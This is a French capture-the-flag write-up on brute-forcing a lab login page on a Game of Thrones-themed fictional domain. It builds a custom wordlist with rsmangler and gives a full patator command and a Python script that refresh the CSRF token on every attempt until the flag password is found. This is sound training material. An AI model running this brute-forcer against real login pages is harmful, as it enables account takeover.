---
title: 5 - Brute Force sur la page de login
next: "/write-ups/wu6"
prev: "/write-ups/wu4"
---


# 🏰 Brute Force sur la page de login  - Castral-Roc

## 🎯 Objectif
Jon doit crocheter la serrure pour rentrer au conseil des lannister ! Il doit **brute-forcer la page de login** sur le sous-domaine **lannister.castral-roc.lannisport.south** pour découvrir **le mot de passe** de James Lannister.

**Flag attendu :** <ILoveCersei>

---

## ⚙️ Environnement
- **Cible :** lannister.castral-roc.lannisport.south
- **Outil utilisé :** rsmangler, patator
- **Wordlist :** custom wordlist créée par le pentester

---


## 🚀 Étape 1 : se rendre sur la page high_login et analyser le comportement du formulaire de connexion


Page de login du Conseil des Lannister :  http://lannister.castral-roc.lannisport.south/high_login.php 

## 🔍 Étape 2 :  Inspecter la page 

Inspecter la page pour trouver les champs du formulaire de connexion.
On voit que le formulaire utilise un token CSRF pour se protéger des attaques CSRF.

> 📝 **CSRF** : Cross-Site Request Forgery est une attaque qui force un utilisateur à exécuter des actions non désirées sur un site Web sur lequel il est authentifié.

Il faut donc trouver un moyen de contourner cette protection.

De plus on remarque que le formulaire de connexion contient un champ **username** et un champ **password**, la methode utilisée est **POST**.

```html
<form method="POST">
        <input type="hidden" name="csrf_token" value="zdagte....">
        <label for="username">Nom d'utilisateur :</label><br>
        <input type="text" id="username" name="username" required><br>
        <label for="password">Mot de passe :</label><br>
        <input type="password" id="password" name="password" required><br>
        <input type="submit" value="Connexion">
</form>
```

## 🚀 Étape 3 : Créer une wordlist personnalisée

1. On remarque sur la page plusieurs **indices** :

```bash	
- James
- Lannister
- Cersei
- Love
- I
```

On peut donc créer une **wordlist personnalisée**  avec ces mots.

Les ajouter a un fichier.

```bash	
nano custom_wordlist.txt
```

Coller les mots dans le fichier, sauvegarder et quiter.

```bash	
James
Lannister
Cersei
Love
I
```


2. Créer un fichier sortie_wordlist.txt avec un multitude de variations possible de ces mots : 

```bash	
rsmangler --file custom_wordlist.txt --output sortie_wordlist.txt
```

Il va donc par exemple y avoir des variations de la forme :

```bash
JamesLaNNisterCerseiLoveI
IJamesLannisterCerseiLove
CerseiLoveIJamesLannister
...
```



## 🔍 Étape 4 : Brute-force du formulaire de connexion

Comme le formulaire utilise un token CSRF, on va utiliser l'outil **patator** pour effectuer un bruteforce sur le formulaire de connexion.
En effet, patator permet de contourner la **protection CSRF** en recuperant le token avec chaque requête.
De ce fait, lorsque l'on envoie une requête, le token est récupéré et utilisé pour la requête suivante.

```bash
patator http_fuzz url="http://lannister.castral-roc.lannisport.south/high_login.php" method=POST body="username=james.lannis&password=FILE0&csrf_token=RESPONSE1" accept_cookie=1 0=sortie_wordlist.txt before_urls="http://lannister.castral-roc.lannisport.south/high_login.php" before_egrep='RESPONSE1:csrf_token" value="([a-f0-9]{32})"' resolve="lannister.castral-roc.lannisport.south:10.10.10.1"
```

Décomposons la commande :

- **http_fuzz** : module de patator pour effectuer des attaques par bruteforce sur des formulaires web
- **url** : l'url de la page de login
- **method** : la méthode HTTP utilisée pour envoyer les requêtes
- **body** : les paramètres du formulaire de connexion
- **accept_cookie** : accepter les cookies
- **0** : le fichier contenant les mots de passe à tester
- **before_urls** : l'url de la page de login
- **before_egrep** : expression régulière pour récupérer le token CSRF, le token peut avoir des valeurs de a à f et de 0 à 9 car il s'agit de valeurs hexadécimale
- **resolve** : résoudre le nom de domaine en adresse IP

Cette commande va tester tous les mots de passe de la wordlist sur le formulaire de connexion.

On aura donc cette sortie : 

```bash
18:23:37 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.11.5 at 2025-02-11 18:23 CET
18:23:37 patator    INFO -                                                                              
18:23:37 patator    INFO - code size:clen       time | candidate                          |   num | mesg
18:23:37 patator    INFO - -----------------------------------------------------------------------------

18:23:38 patator    INFO - 200  1050:-1        0.032 | LoveICersei                        |    74 | HTTP/1.1 200 OK
18:23:38 patator    INFO - 200  1054:-1        0.065 | IJamesLannister                    |    75 | HTTP/1.1 200 OK
18:23:38 patator    INFO - 302  429:-1         0.055 | ILoveCersei                        |    86 | HTTP/1.1 302 Found
```

On voit que le mot de passe **ILoveCersei** a été trouvé, car on a reçu une réponse **HTTP 302 Found**.

On peut également utiliser un script python afin de trouver le mot de passe :

```python {filename="bruteforce.py"} 
import requests
from bs4 import BeautifulSoup

# Configuration
URL = "http://lannister.castral-roc.lannisport.south/high_login.php"
USERNAME = "james.lannis"
WORDLIST = "sortie_wordlist.txt"

def get_csrf_token(session):
    """Récupère dynamiquement le token CSRF depuis la page de login"""
    response = session.get(URL)
    soup = BeautifulSoup(response.text, 'html.parser')
    token_input = soup.find("input", {"name": "csrf_token"})
    return token_input["value"] if token_input else None

def brute_force():
    session = requests.Session()

    with open(WORDLIST, "r", encoding="utf-8", errors="ignore") as file:
        for password in file:
            password = password.strip()
            
            # 🔹 Récupérer dynamiquement le token CSRF AVANT chaque requête
            csrf_token = get_csrf_token(session)
            if not csrf_token:
                print("[!] Impossible d'obtenir le token CSRF !")
                break

            # 🔹 Envoyer la requête POST avec le token valide
            headers = {"User-Agent": "Mozilla/5.0"}
            data = {
                "csrf_token": csrf_token,
                "username": "james.lannis",
                "password": password
            }
            response = session.post(URL, data=data, headers=headers)

            # 🔹 Vérifier si l'authentification est réussie
            if "Identifiants incorrects" not in response.text:
                print(f"[+] Mot de passe trouvé : {password}")
                return
            
            print(f"[-] Échec avec : {password}")

    print("[X] Aucun mot de passe valide trouvé.")

if __name__ == "__main__":
    brute_force()
```

On l'appel avec la commande suivante : 

```bash
python3 bruteforce.py
```

On obtient alors le resultat : 

```bash
[-] Échec avec : 123456
[-] Échec avec : 12345
[-] Échec avec : 123456789
[-] Échec avec : ILoveCersai
[+] Mot de passe trouvé : ILoveCersei
```


## 🎯 Étape 5 : Validation du Flag


